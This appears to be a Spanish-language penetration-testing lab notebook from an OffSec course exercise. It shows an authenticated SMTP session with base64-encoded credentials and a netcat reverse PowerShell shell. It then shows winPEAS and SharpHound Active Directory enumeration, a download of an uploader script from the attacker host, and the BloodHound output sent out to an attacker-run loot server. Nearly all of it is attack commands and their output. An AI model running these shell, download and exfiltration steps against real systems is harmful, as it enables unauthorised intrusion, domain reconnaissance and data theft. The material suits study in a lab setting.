<-  220 MAILSRV1 ESMTP
 -> EHLO localhost
<-  250-MAILSRV1
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> AUTH LOGIN
<-  334 VXNlcm5hbWU6
 -> am9obg==
<-  334 UGFzc3dvcmQ6
 -> ZHFzVHdUcFpQbiNuTA==
<-  235 authenticated.
 -> MAIL FROM:<john@beyond.com>
<-  250 OK
 -> RCPT TO:<marcus@beyond.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> 43 lines sent
<-  250 Queued (13.236 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.

┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces]
└─# nc -lvnp 4444                                                                                                            
listening on [any] 4444 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.234.242] 64753
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
whoami
beyond\marcus
PS C:\Windows\System32\WindowsPowerShell\v1.0> hostname
hostname
CLIENTWK1
PS C:\Windows\System32\WindowsPowerShell\v1.0> ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   IPv4 Address. . . . . . . . . . . : 172.16.190.243
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.190.254
PS C:\Windows\System32\WindowsPowerShell\v1.0> 

# Ejecutamos winPEAS.exe

����������͹ Network Ifaces and known hosts
� The masks are only for the IPv4 addresses 
    Ethernet0[00:50:56:86:24:D8]: 172.16.190.243 / 255.255.255.0
        Gateways: 172.16.190.254
        DNSs: 172.16.190.240
        Known hosts:
          172.16.190.240        00-50-56-86-0F-C9     Dynamic
          172.16.190.254        00-50-56-86-E8-00     Dynamic
          172.16.190.255        FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static
          239.255.255.250       01-00-5E-7F-FF-FA     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static
          239.255.255.250       00-00-00-00-00-00     Static

# Ejecutamos SharpHound:
PS C:\Users\marcus> . .\SharpHound.ps1
PS C:\Users\marcus> Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\marcus\"                  
Invoke-BloodHound -CollectionMethod All -OutputDirectory "C:\Users\marcus\"                                                                                                                                       
2025-06-22T16:00:17.3434320-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound                                                                                       
2025-06-22T16:00:17.4996980-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote              
2025-06-22T16:00:17.5153175-07:00|INFORMATION|Initializing SharpHound at 4:00 PM on 6/22/2025                                                                                                                     
2025-06-22T16:00:17.7965438-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller for beyond.com : DCSRV1.beyond.com                                                                              
2025-06-22T16:00:17.8434188-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote                                    
2025-06-22T16:00:17.9684417-07:00|INFORMATION|Beginning LDAP search for beyond.com                                                                                                                                
2025-06-22T16:00:17.9840320-07:00|INFORMATION|Producer has finished, closing LDAP channel                                                                                                                         
2025-06-22T16:00:17.9996593-07:00|INFORMATION|LDAP channel closed, waiting for consumers                                                                                                                          
2025-06-22T16:00:48.1706955-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 97 MB RAM                                                                                                              
2025-06-22T16:00:58.9357580-07:00|INFORMATION|Consumers finished, closing output channel                                                                                                                          
2025-06-22T16:00:58.9670107-07:00|INFORMATION|Output channel closed, waiting for output task to complete                                                                                                          
Closing writers                                                                                                                                                                                                   
2025-06-22T16:00:59.0607540-07:00|INFORMATION|Status: 97 objects finished (+97 2.365854)/s -- Using 103 MB RAM                                                                                                    
2025-06-22T16:00:59.0607540-07:00|INFORMATION|Enumeration finished in 00:00:41.1014832                                                                                                                            
2025-06-22T16:00:59.1232558-07:00|INFORMATION|Saving cache with stats: 56 ID to type mappings.                                                                                                                    
 57 name to SID mappings.                                                                                                                                                                                         
 1 machine sid mappings.                                                                                                                                                                                          
 2 sid to domain mappings.                                                                                                                                                                                        
 0 global catalog mappings.                                                                                                                                                                                       
2025-06-22T16:00:59.1388873-07:00|INFORMATION|SharpHound Enumeration Completed at 4:00 PM on 6/22/2025! Happy Graphing!                                                                                           
PS C:\Users\marcus> 

# Looteo del .zip

┌──(root㉿kali)-[/home/kali/Scripts/05_Utils/loot_server]
└─# python3 loot_server.py     
Listening on port 8000 for uploads...
192.168.209.242 - - [22/Jun/2025 20:20:49] "POST / HTTP/1.1" 200 -

PS C:\Users\marcus> iwr -uri http://192.168.45.213:8000/Send-FileToLootSerer.ps1 -Outfile looter.ps1
iwr -uri http://192.168.45.213:8000/Send-FileToLootSerer.ps1 -Outfile looter.ps1
PS C:\Users\marcus> dir
dir


    Directory: C:\Users\marcus


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-r---         9/29/2022   1:49 AM                Contacts                                                             
d-r---         9/29/2022   1:49 AM                Desktop                                                              
d-r---         9/29/2022   4:37 AM                Documents                                                            
d-r---         9/29/2022   4:33 AM                Downloads                                                            
d-r---         9/29/2022   1:49 AM                Favorites                                                            
d-r---         9/29/2022   1:49 AM                Links                                                                
d-r---         9/29/2022   1:49 AM                Music                                                                
d-r---         9/29/2022   1:50 AM                OneDrive                                                             
d-r---         9/29/2022   1:50 AM                Pictures                                                             
d-r---         9/29/2022   1:49 AM                Saved Games                                                          
d-r---         9/29/2022   1:50 AM                Searches                                                             
d-r---         9/29/2022   4:30 AM                Videos                                                               
-a----         6/22/2025   4:00 PM          11850 20250622160058_BloodHound.zip                                        
-a----         6/22/2025   4:18 PM           1218 looter.ps1                                                           
-a----         6/22/2025   8:55 AM        1308348 SharpHound.ps1                                                       
-a----         6/22/2025   4:00 PM           8557 Zjc5OGNlNTktMzQ0Ni00YThkLWEzZjEtNWNhZGJlNzdmODZl.bin                 


PS C:\Users\marcus> .\looter.ps1 -FilePath "C:\Users\marcus\20250622160058_BloodHound.zip" -URL "http://192.168.45.213:8000"
.\looter.ps1 -FilePath "C:\Users\marcus\20250622160058_BloodHound.zip" -URL "http://192.168.45.213:8000"


StatusCode        : 200
StatusDescription : OK
Content           : {70, 105, 108, 101...}
RawContent        : HTTP/1.0 200 OK
                    Date: Sun, 22 Jun 2025 23:20:49 GMT
                    Server: BaseHTTP/0.6 Python/3.13.2
                    
                    File received.
Headers           : {[Date, Sun, 22 Jun 2025 23:20:49 GMT], [Server, BaseHTTP/0.6 Python/3.13.2]}
RawContentLength  : 14

Archivo enviado exitosamente: 20250622160058_BloodHound.zip
```

#### Revisamos archivo .zip en BloodHound:

```bash
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/CLIENTWK1]
└─# mv /tmp/20250622160058_BloodHound.zip .
                                                                                                       
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/CLIENTWK1]
└─# ll     
total 12
-rw-r--r-- 1 root root 11850 Jun 22 20:20 20250622160058_BloodHound.zip
                                                                                                       
┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces/CLIENTWK1]
└─# unzip 20250622160058_BloodHound.zip -d clientwk1_bloodHound                             
Archive:  20250622160058_BloodHound.zip
  inflating: clientwk1_bloodHound/20250622160058_computers.json  
  inflating: clientwk1_bloodHound/20250622160058_users.json  
  inflating: clientwk1_bloodHound/20250622160058_groups.json  
  inflating: clientwk1_bloodHound/20250622160058_containers.json  
  inflating: clientwk1_bloodHound/20250622160058_domains.json  
  inflating: clientwk1_bloodHound/20250622160058_gpos.json  
  inflating: clientwk1_bloodHound/20250622160058_ous.json  

┌──(root㉿kali)-[/home/kali/OffSec/27-Assembling-The-Pieces]
└─# neo4j console                                                                                                                                
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2025-06-22 23:37:50.649+0000 INFO  Starting...
2025-06-22 23:37:51.928+0000 INFO  This instance is ServerId{314dfaa4} (314dfaa4-208b-460b-be06-b478ecaac179)
2025-06-22 23:37:55.134+0000 INFO  ======== Neo4j 4.4.26 ========
2025-06-22 23:37:57.813+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2025-06-22 23:37:57.813+0000 INFO  Updating the initial password in component 'security-users'
2025-06-22 23:38:00.215+0000 INFO  Bolt enabled on localhost:7687.
2025-06-22 23:38:02.314+0000 INFO  Remote interface available at http://localhost:7474/
2025-06-22 23:38:02.323+0000 INFO  id: 6E609F2ACAD00EBB958BE98FA03FC7D10AC2C3AC78BF48E2F8A88586CC045C3B
2025-06-22 23:38:02.324+0000 INFO  name: system
2025-06-22 23:38:02.324+0000 INFO  creationDate: 2025-04-18T14:40:04.27Z
2025-06-22 23:38:02.325+0000 INFO  Started.                                                                                                       
```



## Troubleshooting

## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

